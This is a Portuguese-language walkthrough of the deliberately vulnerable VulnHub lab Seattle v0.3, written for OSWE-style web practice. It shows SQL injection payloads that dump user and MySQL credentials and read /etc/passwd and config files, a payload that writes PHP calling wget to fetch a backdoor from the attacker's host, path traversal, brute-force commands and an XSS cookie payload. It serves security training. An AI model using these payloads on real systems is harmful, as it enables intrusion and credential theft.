---
title: "VulnHub - Seattle v0.3"
tags: [Linux,Medium,Brute Force,BurpSuite,Gobuster,XSS,SQLInjection,Brute Force]
categories: VulnHub OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/inicial.png)

Link: [Seattle v0.3](https://www.vulnhub.com/entry/seattle-v03,145/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 2 portas aberta no servidor

> Porta 80 -> Web

```
Essa máquina vamos fazer de um modo diferente, ela tem várias vulnerabilidades já pré-configuradas pra gente treinara s habilidades em web, vou tentar demonstrar cada uma delas
```

As vulnerabilidades que serão exploradas serão:

1. SQL Injection
2. Listar diretórios
3. Path Transversal
4. Enumeração de Usuários (BruteForce)
5. Reflected XSS

## Enumeração da Porta 80

Abrimos pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/web.png)

Página web normal...

# SQL Injection

Vamos começar com o SQL Injection, identificando, testando e explorando essa vulnerabilidade

## Identificando

Para conseguir perceber onde temos SQLInjection o jeito é ir vendo as páginas que estão disponíveis no site procurando por algum lugar que possa estar fazendo alguam interface com algum banco de dados

Encontramos um ponto onde parece estar acontecendo isso, ao clicarmos em Vynil ou Clothing e depois em Details, ele nos da algumas informações interessantes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli.png)

```
http://192.168.56.133/details.php?prod=1&type=2
```

Isso parece estar sendo feito alguma interface com algum banco de dados

## Testando

Para testar, eu sempre gosto de jogar a requisição para o BurpSuite por que lá é mais fácil de modificar a url e tudo mais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/burp2.png)

Ao adiconarmos uma ' na requisição, temos:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/burp3.png)

Saída de erro, possivelmente podemos fazer algum tipo de injeção de sql e algum dump de dados

Como funciona SQL Injection?

Agora, vamos tentar explicar como é o funcionamento do SQLInjection a partir de como está montada a query

Primeiro devemos verificar como o MYSQL se estrutura

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s.png)

[MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html)

Podemos executar todos esses comandos que estão descritos na imagem abaixo, e também o `UNION SELECT`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s1.png)

Agora vamos explorar com o UNION SELECT

O que acontece quando eu utilizo o union select é que eu devo ter de um lado da requisição (depois do prdo) o mesmo numero de argumentos que eu tenho na URL que tava ali antes, no caso são 5, ai a query funciona normalmente, ele vai aparecer normalmente pq não teve erro algum

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli1.png)

Ai está, conseguimos manipular os itens 3 e 5

## Explorando

Agora vamos iniciar a exfiltração de informações desese banco de dados

Bom, agora que sabemos que temos um ponto que pode ser explorado vamos partir para outra parte, a explicação de como funciona a tabela SCHEMA

A tabela SCHEMA do banco de dados é interessante nós realizarmos o dump nela, uma vez que ela contém uma "prévia" de todas as outras tabelas

[Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b4.png)

Com a dica do site pentestmonkney.net eu começo a extração

[Monkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

SELECT SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b5.png)

Ai está

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli2.png)

Para uma vizualização melhor, devemos utilizar o group_concat, que vai concatenar mais de um resultado

SELECT group_concat(SCHEMA_NAME,":") from INFORMATION_SCHEMA.SCHEMATA LIMIT 1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli3.png)

Opa, essa database `seattle` é interessante

Agora verifico quais campos (tables e colunas) se encontram nessa database seattle que nos pareceu a mais promissora

(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'seattle'),4,5

ou aqui vamos extrair apenas as tabelas que temos na databse seattle 

UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME),4,5 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = "seattle"-- -

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa.png)

tblMembers,tblProducts,tblBlogs

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli4.png)

Ai estão todas as tables dessa database

Agora vamos extrair as colunas (COLUMN_NAME) das tables

tblBlogs:author,tblBlogs:title,tblBlogs:content,
tblMembers:id,tblMembers:username,tblMembers:password,
tblMembers:session,tblMembers:name,tblMembers:blog,
tblMembers:admin,tblProducts:id,tblProducts:type,
tblProducts:name,tblProducts:price,tblProducts:detail

UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "seattle"-- -

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa1.png)

Certo, agora vamos extrair aquelas informações da database seattle com a table tblMembers e as colunas username e password

UNION SELECT 1,2,GROUP_CONCAT(username,":",password),4,5 from tblMembers-- -

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa2.png)

`admin@seattlesounds.net:Assasin1`

Pronto, temos a senha dele!

## Extraindo a senha do Banco de Dados

No pentestmonkey.net tem como faço pra listar esses usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b10.png)

Então, faço a extração

(SELECT+group_concat(host,+user,+password)+FROM+mysql.user)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli5.png)

`localhostroot*56C28F8C2F6D2BD560D6D2F04565A902BEAA3738,127.0.0.1root*845A9ADD7E1A82B6459804066B3A45D0025897B6,::1root*845A9ADD7E1A82B6459804066B3A45D0025897B6`

Ai está, agora vejo como faço pra tentar quebrar essa senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_j.png)

Realizo a quebra da senha

`john --format=mysql-sha1 mysql.hash`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/john.png)

Pronto, conseguimos quebrar um dos hashs, e a senha é PASSWORD

### Outro modo de se descobrir a senha

Bom, também há outro modo de se descobrirmos essa senha, através de um LFI pelo SQLInjection

A ideia aqui é explorar esse SQLi para termos um LFI, e com esse LFI ler o arquivo de configuração do banco de dados, onde está a credencial de acesso

UNION+SELECT+1,2,(LOAD_FILE("/etc/passwd")),4,5

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli6.png)

(LOAD_FILE("/var/www/html/details.php"))

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli7.png)

(LOAD_FILE("/var/www/html/prod-details.php"))

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli8.png)

(LOAD_FILE("/var/www/html/connection.php"))

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli9.png)

(LOAD_FILE("/var/www/html/config.php"))

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli10.png)

Pronto, descobrimos outra senha

```
$user = 'root';
$pass = 'Alexis*94';
```

### Upload de Arquivos

Sim, também podemos fazer upload de arquivos, e seguindo essa ideia fazer upload de um shell php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/back.png)

(SELECT '<?php exec("wget -O /var/www/html/sqli.php http://192.168.56.102/simple-backdoor.php"); ?>'),4,5 INTO OUTFILE '/var/www/html/rev.php'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli11.png)

Permissão negada, beleza, o que vale é a ideia, muitas vezes o administrador da página web deixa a permissão de escrita pro usuário nessa pasta, ai conseguimos fazer o upload de arquivos lá

Caso desse certo, deveriamos acessar o `rev.php` pra ele fazer o download do simples-backdoor.php e depois acessar o `sqli.php` pra conseguirmos executar comandos na máquina.

### SQLMap

Também podemos usar o sqlmap pra descobrir a senha, apesar de eu não gostar dessa ferramenta, é importante mostrarmos a utilidade dela

Salvamos para um arquivo a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req.png)

E fazemos o dump

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req1.png)

Aqui está a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req2.png)

Simples assim.

# Listagem de Diretórios

Com o resultado do gobuster, verificamos que podemos ver o /admin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/admin.png)

Contudo não coseguimos ver os arquivos, isso vai ser possível na próxima vulnerabilidade explorada

# Path Transversal

Outra coisa que podemos explorar aqui é o Path Transversal

Na parte de downloads, de cara já verificamos que ele está puxando arquivos da máquina

**http://192.168.56.133/download.php?item=Brochure.pdf**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/dow.png)

Podemos alterar o path do Brochure e fazer download de qualquer arquivo que o www-data tenha permissão

**http://192.168.56.133/download.php?item=../../../../../../../etc/passwd**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/dow1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/dow2.png)

Logo, podemos ler os arquivos do diretório /admin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/dow3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/dow4.png)

Aqui do mesmo modo vamos conseguir aquela senha do banco de dados.

# Enumeração de Usuários

Conseguimos fazer enumeração de usuários através do campo de login, pois as mensagens de erro são diferentes para usuários não existentes e incorretos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/inv.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/inv1.png)

Conseguimos descobrir o login do admin no blog.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/user.png)

Agora podemos fazer um ataque de força bruta nele, pra tentar descobrirmos a senha

Jogamos a requisição pro Burp, pra ver melhor como está sendo feito a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/brute1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/brute.png)

Agora montamos nossa query com o Wfuzz

## Wfuzz Brute Force

```bash
wfuzz -c -z file,senha.txt -L --hw 173 -d "usermail=admin%40seattlesounds.net&password=FUZZ" http://192.168.56.133/login.php
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/wfuzz.png)

Também podemos utilizar o BurpSuite Intruder pra fazer isso

## BurpSuite Intruder

Enviamos para o Intruder

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/int.png)

Setamos o payload e a wordlist

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/int1.png)

Realizamos o ataque, e a única resposta diferente das demais quer dizer que a tentativa foi sucesso!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/int2.png)

# Reflected XSS

Agora com acesso ao painel de administrador, descobrimos que podemos explorar também a vulnerabilidade de Reflected XSS.

Mas primeiro, o que é reflected xss?

É uma vulnerabilidade presente em aplicações web que permite que o cibercriminoso insira códigos JavaScript para obter certos tipos de vantagem sobre as vítimas.

O Cross-Site Scripting (XSS) é normalmente aplicado em páginas que sejam comuns a todos os usuários, como por exemplo a página inicial de um site ou até mesmo páginas onde usuários podem deixar seus depoimentos. Para que o ataque possa ocorrer é necessário um formulário que permita a interação do atacante, como por exemplo em campos de busca ou inserção de comentários.

No campo dos comentários verificamos que temos isso habilitado nesse servidor

```js
<script>alert(document.cookie)</script>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/xss.png)

Ao acessarmos o blog, temos o XSS sendo executado!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/xss1.png)

# PHPInfo

Temos acesso também ao PHPInfo desse website, isso é bem perigoso pois nos da diversas informações sobre o servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/php.png)

Informações:

```
allow_url_fopen=On - LFI pode ser possível
allow_url_include=Off - RFI não vai ser possível
display_errors=Off - não vamos ter saidas de erro
include_path: .:/usr/share/pear:/usr/share/php - LFI só vai ser possível nesses paths
file_uploads=On - podemos tentar fazer um PHPInfolfi e ganhar um shell na máquina
```

Bom, dessa máquina creio que seja isso, não consegui ver nenhum método de se pegar shell reverso nela... Até verificamos que temos apenas o usuário root com shell válido...